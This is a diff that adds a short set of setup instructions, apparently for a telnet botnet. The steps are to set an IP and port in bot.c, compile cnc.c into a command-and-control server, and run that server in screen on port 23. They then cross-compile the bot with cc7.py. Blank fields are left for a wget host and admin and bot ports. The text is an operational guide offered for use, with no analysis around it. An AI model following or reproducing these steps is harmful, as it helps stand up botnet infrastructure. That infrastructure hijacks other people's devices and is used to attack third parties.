@@ -1,0 +1,20 @@
+Change IP and port in bot.c
+
+gcc cnc.c -o server -pthread
+
+nano login.txt 
+
+screen ./server 23 1000 <port from bot.c> || Ex. [ screen ./server 23 1000 666  ]
+
+Press CTRL + A + D
+
+python cc7.py bot.c <ip>
+
+
+
+
+Wget:
+
+Admin port:
+
+Bot port: 23
